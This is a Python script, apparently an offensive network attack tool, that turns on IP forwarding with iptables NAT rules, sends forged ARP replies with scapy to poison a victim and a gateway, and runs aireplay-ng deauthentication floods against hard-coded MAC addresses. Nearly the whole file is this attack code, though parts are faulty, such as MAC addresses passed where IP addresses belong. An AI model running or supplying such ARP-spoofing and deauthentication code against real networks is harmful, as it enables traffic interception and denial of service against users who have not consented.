from scapy.all import ARP, Ether, sendp
import logging
from typing import Tuple, Optional
from utils import logger, run_cmd
import os

def enable_ip_forwarding() -> None:
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    os.system("iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE")
    os.system("iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT")
    os.system("iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT")

def deauthenthicate(bssid_ap: str, bssid_c: Optional[str], iface: str, count: int = 1) -> Tuple[int, str, str]:
    if count is None:
        count = 0
    
    cmd_deauth = ["aireplay-ng", "--deauth", str(count), "-a", bssid_ap]
    if bssid_c:
        cmd_deauth += ["-c", bssid_c]
    cmd_deauth.append(iface)
    print(cmd_deauth)
    rc, stdout, stderr = run_cmd(cmd_deauth, timeout=10 + (int(count) if int(count) > 0 else 0))
    if rc != 0:
        logger.error("Failed to send deauthentication command: %s", stderr)
    else:
        logger.debug("Deauth sent: %s", cmd_deauth)
    return rc, stdout, stderr


def send_arp(bssid_ap: str, bssid_c: str, mac: str, iface:str, count: int = 1) -> Tuple[int, str, str]:
    if count is None:
        count = 0

    arp_to_victim = ARP(op=2, pdst=bssid_c, psrc=bssid_ap, hwdst=mac)
    arp_to_gateway = ARP(op=2, pdst=bssid_ap, psrc=bssid_c, hwdst=mac)
    ether = Ether(dst=mac)
    packet_to_victim = ether / arp_to_victim
    packet_to_gateway = ether / arp_to_gateway
    while(count != 0):
        sendp(packet_to_victim, verbose=False)
        sendp(packet_to_gateway, verbose=False)
        count -= 1



if __name__ == "__main__":

    bssid_ap = "C0:25:2F:F3:0A:A0"
    bssid_c = "26:e8:dc:f1:22:36"
    mac = "7c:3d:09:00:40:96"
    iface = "wlan0"
    enable_ip_forwarding()
    send_arp(bssid_ap, bssid_c, mac, iface, count=5)
    deauthenthicate(bssid_ap, bssid_c, iface, count=5)